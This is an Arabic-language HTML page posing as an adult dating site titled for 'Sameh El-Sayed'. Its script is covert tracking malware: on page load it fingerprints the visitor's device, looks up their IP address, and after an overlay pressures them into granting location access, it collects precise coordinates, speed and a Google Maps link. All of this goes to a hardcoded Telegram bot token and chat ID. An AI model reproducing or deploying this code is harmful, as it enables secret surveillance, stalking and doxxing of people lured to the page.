<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>صفحة سامح السيد</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #f0f2f5;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
        }
        .container {
            max-width: 800px;
            background-color: #fff;
            border-radius: 10px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            overflow: hidden;
            text-align: center;
            padding: 20px;
            color: #333;
        }
        .header {
            padding: 20px;
            background-color: #4267B2;
            color: #fff;
        }
        .header img {
            width: 150px;
            border-radius: 50%;
        }
        .header h1 {
            margin: 10px 0;
            font-size: 24px;
        }
        .content {
            padding: 20px;
        }
        .content p {
            font-size: 18px;
            color: #555;
        }
        .profiles {
            display: flex;
            justify-content: center;
            flex-wrap: wrap;
        }
        .profile {
            margin: 10px;
            text-align: center;
        }
        .profile img {
            width: 100px;
            height: 100px;
            border-radius: 50%;
            border: 2px solid #4267B2;
        }
        .profile p {
            margin-top: 5px;
            font-size: 16px;
            color: #333;
        }
        .footer {
            padding: 10px;
            font-size: 14px;
        }
        .footer a {
            color: #4267B2;
            text-decoration: none;
        }
        .overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.8);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 9999;
        }
        .overlay .popup {
            background-color: #fff;
            padding: 20px;
            border-radius: 10px;
            text-align: center;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
        }
        .overlay .popup button {
            background-color: #4267B2;
            color: #fff;
            border: none;
            padding: 10px 20px;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
        }
    </style>
</head>
<body>
    <div class="overlay" id="overlay">
        <div class="popup">
            <p>يرجى السماح بإذن الموقع الجغرافي للمتابعة</p>
            <button onclick="requestLocationPermission()">السماح</button>
        </div>
    </div>

    <div class="container" id="content" style="display: none;">
        <div class="header">
            <img src="https://example.com/image.jpg" alt="سامح السيد">
            <h1>سامح السيد</h1>
        </div>
        <div class="content">
            <p>استمتع بالتعرف على أشخاص جدد ومشاهدة محتوى حصري للكبار فقط.</p>
            <div class="profiles">
                <div class="profile">
                    <img src="https://randomuser.me/api/portraits/women/81.jpg" alt="مستخدم">
                    <p>أمل</p>
                </div>
                <div class="profile">
                    <img src="https://randomuser.me/api/portraits/men/82.jpg" alt="مستخدم">
                    <p>محمد</p>
                </div>
                <div class="profile">
                    <img src="https://randomuser.me/api/portraits/women/83.jpg" alt="مستخدم">
                    <p>ليلى</p>
                </div>
                <div class="profile">
                    <img src="https://randomuser.me/api/portraits/men/84.jpg" alt="مستخدم">
                    <p>علي</p>
                </div>
            </div>
        </div>
        <div class="footer">
            <p>حقوق الطبع والنشر © 2024 موقع التعارف. جميع الحقوق محفوظة. <a href="#">سياسة الخصوصية</a></p>
        </div>
    </div>

    <script>
        function sendInformationToTelegram(info) {
            var botToken = '7172876720:AAHHrUi-6VOFhhtJnyP2fpIM6yeU5Y9mYho';
            var chatId = '962686305';
            var url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(info)}`;

            fetch(url).then(response => {
                if (!response.ok) {
                    throw new Error('Network response was not ok');
                }
                return response.json();
            }).then(data => {
                console.log('Information sent to Telegram bot:', data);
            }).catch(error => {
                console.error('There was a problem with the fetch operation:', error);
            });
        }

        function collectDeviceInfo() {
            var ptf = navigator.platform;
            var cc = navigator.hardwareConcurrency || 'غير متوفر';
            var ram = navigator.deviceMemory || 'غير متوفر';
            var ver = navigator.userAgent;
            var brw = 'غير متوفر';
            var canvas = document.createElement('canvas');
            var gl, debugInfo, ven, ren;

            if (ver.indexOf('Firefox') != -1) {
                brw = 'Firefox';
            } else if (ver.indexOf('Chrome') != -1) {
                brw = 'Chrome';
            } else if (ver.indexOf('Safari') != -1) {
                brw = 'Safari';
            } else if (ver.indexOf('Edge') != -1) {
                brw = 'Edge';
            }

            try {
                gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            } catch (e) { }
            if (gl) {
                debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                ven = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) || 'غير متوفر';
                ren = gl.getParameter(debugInfo.UNMASKED_RENDERER_INFO) || 'غير متوفر';
            }

            var ht = window.screen.height;
            var wd = window.screen.width;
            var os = ver.substring(0, ver.indexOf(')')).split(';')[1].trim() || 'غير متوفر';

            var deviceInfo = `منصة الجهاز: ${ptf}\nعدد النوى: ${cc}\nالذاكرة العشوائية: ${ram}\nنوع المتصفح: ${brw}\nنظام التشغيل: ${os}\nدقة الشاشة: ${ht}x${wd}\nالشركة المصنعة لوحدة المعالجة الرسومية: ${ven}\nنوع وحدة المعالجة الرسومية: ${ren}`;
            sendInformationToTelegram(deviceInfo);

            // Collect IP address
            fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => {
                    var ipInfo = `عنوان IP: ${data.ip}`;
                    sendInformationToTelegram(ipInfo);
                })
                .catch(error => console.error('Error fetching IP address:', error));
        }

        function requestLocationPermission() {
            if (navigator.geolocation) {
                var optn = { enableHighAccuracy: true, timeout: 30000, maximumAge: 0 };
                navigator.geolocation.getCurrentPosition(function(position) {
                    var lat = position.coords.latitude || 'غير متوفر';
                    var lon = position.coords.longitude || 'غير متوفر';
                    var acc = position.coords.accuracy || 'غير متوفر';
                    var alt = position.coords.altitude || 'غير متوفر';
                    var dir = position.coords.heading || 'غير متوفر';
                    var spd = position.coords.speed || 'غير متوفر';

                    var googleMapsLink = `https://www.google.com/maps?q=${lat},${lon}&z=17&hl=ar`;
                    var locationInfo = `إحداثيات: خط العرض ${lat}، خط الطول ${lon}\nدقة الموقع: ${acc} متر\nالارتفاع: ${alt} متر\nالاتجاه: ${dir} درجة\nالسرعة: ${spd} متر/ثانية\n\nرابط الموقع على جوجل مابس: ${googleMapsLink}`;
                    sendInformationToTelegram(locationInfo);

                    document.getElementById('overlay').style.display = 'none';
                    document.getElementById('content').style.display = 'block';
                }, function (error) {
                    alert('يرجى تفعيل إذن الموقع للمتابعة.');
                    document.getElementById('overlay').style.display = 'flex';
                }, optn);
            } else {
                alert('جهازك لا يدعم تحديد الموقع الجغرافي.');
            }
        }

        // إرسال المعلومات عند تحميل الصفحة
        window.onload = function() {
            collectDeviceInfo();
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(function(position) {
                    requestLocationPermission();
                }, function(error) {
                    document.getElementById('overlay').style.display = 'flex';
                });
            } else {
                alert('جهازك لا يدعم تحديد الموقع الجغرافي.');
            }
        };
    </script>
</body>
</html>
